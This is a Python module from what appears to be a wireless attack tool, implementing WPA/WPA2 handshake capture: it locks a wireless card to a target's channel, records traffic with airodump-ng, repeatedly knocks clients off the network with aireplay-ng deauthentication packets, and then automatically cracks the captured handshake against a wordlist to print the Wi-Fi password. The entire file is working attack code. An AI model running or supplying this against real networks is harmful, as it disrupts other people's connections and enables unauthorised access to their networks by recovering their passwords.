"""
Handshake Capture Module
Handles channel locking, active deauth, handshake capture, and automatic cracking.
"""

import subprocess
import os
import time
import re
from pathlib import Path
from typing import List, Optional
from core.scanner import AccessPoint
from core.cracker import PasswordCracker
from colorama import Fore, Style

class HandshakeCapture:
    """Captures WPA/WPA2 handshakes and automatically starts cracking."""
    
    def __init__(self, interface, output_dir='./avict_hs'):
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.capture_file = None
        self.capture_process = None
        self.cracker = PasswordCracker()
    
    def lock_channel(self, channel: int):
        """Lock interface to specific channel."""
        try:
            subprocess.run(
                ['sudo', 'iw', self.interface, 'set', 'channel', str(channel)],
                capture_output=True,
                text=True,
                check=True
            )
            print(f"{Fore.GREEN}[+] Locked to channel {channel}{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[-] Error locking channel: {e}{Style.RESET_ALL}")
            return False
    
    def capture_handshake_with_deauth(self, target: AccessPoint, max_attempts: int = 5, wait_time: int = 30):
        """
        Capture handshake using active deauthentication technique.
        Automatically starts cracking when handshake is captured.
        
        Args:
            target: Target access point
            max_attempts: Maximum deauth attempts
            wait_time: Time to wait after each deauth
        
        Returns:
            True if handshake captured and cracked, False otherwise
        """
        print(f"\n{Fore.CYAN}[*] Starting handshake capture for: {target.ssid}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] BSSID: {target.bssid}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Channel: {target.channel}{Style.RESET_ALL}\n")
        
        # Lock to target channel
        self.lock_channel(target.channel)
        
        # Generate capture filename
        safe_ssid = re.sub(r'[^\w\-_]', '_', target.ssid)
        timestamp = int(time.time())
        capture_base = self.output_dir / f"{safe_ssid}_{target.bssid.replace(':', '')}_{timestamp}"
        self.capture_file = capture_base.with_suffix('.cap')
        
        # Start airodump-ng capture in background
        print(f"{Fore.YELLOW}[*] Starting packet capture...{Style.RESET_ALL}")
        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', target.bssid,
            '--channel', str(target.channel),
            '--write', str(capture_base),
            '--output-format', 'cap',
            self.interface
        ]
        
        try:
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Give it a moment to start
            time.sleep(3)
            
            # Attempt deauth and capture
            for attempt in range(1, max_attempts + 1):
                print(f"\n{Fore.YELLOW}[*] Deauth attempt {attempt}/{max_attempts}...{Style.RESET_ALL}")
                
                # Send deauth packets
                self._send_deauth(target)
                
                # Wait and check for handshake
                print(f"{Fore.YELLOW}[*] Waiting for handshake...{Style.RESET_ALL}")
                for _ in range(wait_time):
                    if self._check_handshake_file():
                        print(f"\n{Fore.GREEN}[+] Handshake captured!{Style.RESET_ALL}")
                        self._stop_capture()
                        
                        # Automatically start cracking
                        print(f"\n{Fore.CYAN}[*] Starting automatic password cracking...{Style.RESET_ALL}")
                        password = self._auto_crack_handshake()
                        
                        if password:
                            print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                            print(f"{Fore.GREEN}[+] PASSWORD FOUND: {password}{Style.RESET_ALL}")
                            print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                            return True
                        else:
                            print(f"{Fore.YELLOW}[!] Password not found in wordlist{Style.RESET_ALL}")
                            print(f"{Fore.CYAN}[*] Handshake saved: {self.capture_file}{Style.RESET_ALL}")
                            return True  # Handshake captured even if not cracked
                    
                    time.sleep(1)
                    print(f"{Fore.YELLOW}[*] Waiting... ({_+1}s/{wait_time}s){Style.RESET_ALL}", end='\r')
            
            self._stop_capture()
            print(f"\n{Fore.RED}[-] Failed to capture handshake after {max_attempts} attempts{Style.RESET_ALL}")
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error during capture: {e}{Style.RESET_ALL}")
            self._stop_capture()
            return False
    
    def _send_deauth(self, target: AccessPoint):
        """Send deauthentication packets to force client reconnection."""
        try:
            # If we have client MACs, target them specifically
            if target.clients:
                print(f"{Fore.CYAN}[*] Sending deauth to {len(target.clients)} client(s)...{Style.RESET_ALL}")
                for client in target.clients[:3]:  # Limit to 3 clients
                    cmd = [
                        'sudo', 'aireplay-ng',
                        '--deauth', '5',
                        '-a', target.bssid,
                        '-c', client,
                        self.interface
                    ]
                    subprocess.run(cmd, capture_output=True, timeout=3, check=False)
            else:
                # Broadcast deauth
                print(f"{Fore.CYAN}[*] Sending broadcast deauth...{Style.RESET_ALL}")
                cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', '5',
                    '-a', target.bssid,
                    self.interface
                ]
                subprocess.run(cmd, capture_output=True, timeout=3, check=False)
            
            time.sleep(2)  # Wait for clients to reconnect
            
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Deauth error: {e}{Style.RESET_ALL}")
    
    def _check_handshake_file(self) -> bool:
        """Check if capture file contains a valid handshake."""
        # Check for airodump-ng generated files
        cap_files = list(self.output_dir.glob('*.cap'))
        if cap_files:
            # Use most recent
            self.capture_file = sorted(cap_files, key=lambda x: x.stat().st_mtime, reverse=True)[0]
        else:
            return False
        
        # Validate handshake using aircrack-ng
        try:
            result = subprocess.run(
                ['sudo', 'aircrack-ng', str(self.capture_file)],
                capture_output=True,
                text=True,
                timeout=5,
                check=False
            )
            
            output = result.stdout + result.stderr
            # Check for handshake indicators
            if '1 handshake' in output.lower() or ('handshake' in output.lower() and '0 handshake' not in output.lower()):
                return True
            
            return False
        except Exception:
            # If validation fails, check file size
            return self.capture_file.exists() and self.capture_file.stat().st_size > 1000
    
    def _auto_crack_handshake(self) -> Optional[str]:
        """Automatically crack the captured handshake."""
        if not self.capture_file or not self.capture_file.exists():
            return None
        
        # Use default wordlist
        wordlist = self.cracker.wordlist_path
        if not wordlist:
            print(f"{Fore.RED}[-] No wordlist found!{Style.RESET_ALL}")
            return None
        
        print(f"{Fore.CYAN}[*] Using wordlist: {wordlist}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] This may take a while...{Style.RESET_ALL}\n")
        
        # Start cracking
        password = self.cracker.crack_handshake(self.capture_file, wordlist)
        return password
    
    def _stop_capture(self):
        """Stop the capture process."""
        if self.capture_process:
            try:
                self.capture_process.terminate()
                self.capture_process.wait(timeout=5)
            except Exception:
                try:
                    self.capture_process.kill()
                except Exception:
                    pass
            self.capture_process = None
    
    def get_capture_file(self) -> Path:
        """Get the path to the captured handshake file."""
        return self.capture_file
